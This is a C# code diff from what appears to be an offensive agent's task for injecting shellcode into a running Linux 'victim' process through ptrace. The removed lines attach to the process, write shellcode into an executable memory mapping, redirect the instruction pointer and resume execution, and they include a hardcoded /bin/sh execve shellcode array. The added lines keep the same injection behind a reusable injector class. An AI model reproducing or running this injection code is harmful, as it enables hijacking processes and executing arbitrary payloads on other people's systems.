@@ -51,54 +51,22 @@ namespace Agent
                 return;
             }
 
-            // Attach to the victim process.
-            if (PTrace.PtraceAttach(victimPid) < 0)
-            {
-                messageManager.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
-                return;
-            }
-            PTrace.Wait(null);
-
-            messageManager.WriteLine($"[*] Attach to the process with PID {victimPid}.", job.task.id, false);
-
-            // Save old register state.
-            PTrace.UserRegs oldRegs;
-            if (PTrace.PtraceGetRegs(victimPid, out oldRegs) < 0)
-            {
-                messageManager.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
-                return;
-            }
-
             long address = ParseMapsFile(victimPid);
-
-            int payloadSize = SHELLCODE.Length;
-            ulong[] payload = new ulong[payloadSize / 8];
+            if (address < 0)
+            {
+                messageManager.WriteLine("Could not find an executable mapping. Aborting.", job.task.id, true, "error");
+                return;
+            }
 
             messageManager.WriteLine($"[*] Injecting payload at address 0x{address:X}.", job.task.id, false);
-
-            for (int i = 0; i < payloadSize; i += 8)
+            var injector = new LinuxShellcodeInjector(new LinuxPtraceNative());
+            if (!injector.Inject(victimPid, address, buf))
             {
-                ulong value = BitConverter.ToUInt64(SHELLCODE, i);
-                if (PTrace.PtracePokeText(victimPid, address + i, value) < 0)
-                {
-                    messageManager.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
-                    return;
-                }
-            }
-
-            messageManager.WriteLine("[*] Jumping to the injected code.", job.task.id, true, "error");
-            PTrace.UserRegs regs = oldRegs;
-            regs.rip = (ulong)address;
-
-            if (PTrace.PtraceSetRegs(victimPid, regs) < 0)
-            {
-                messageManager.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
-                return;
-            }
-
-            if (PTrace.PtraceCont(victimPid, IntPtr.Zero) < 0)
-            {
-                messageManager.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
+                messageManager.WriteLine(
+                    $"Failed to {injector.FailedOperation}: {injector.LastError}",
+                    job.task.id,
+                    true,
+                    "error");
                 return;
             }
 
@@ -109,12 +77,6 @@ namespace Agent
         const int PID_MAX = 32768;
         const int PID_MAX_STR_LENGTH = 64;
 
-        // http://shell-storm.org/shellcode/files/shellcode-806.php
-        static readonly byte[] SHELLCODE = new byte[]
-        {
-        0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7,
-        0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, 0x3B, 0x0F, 0x05
-        };
 
         private int GetProcPidMax()
         {
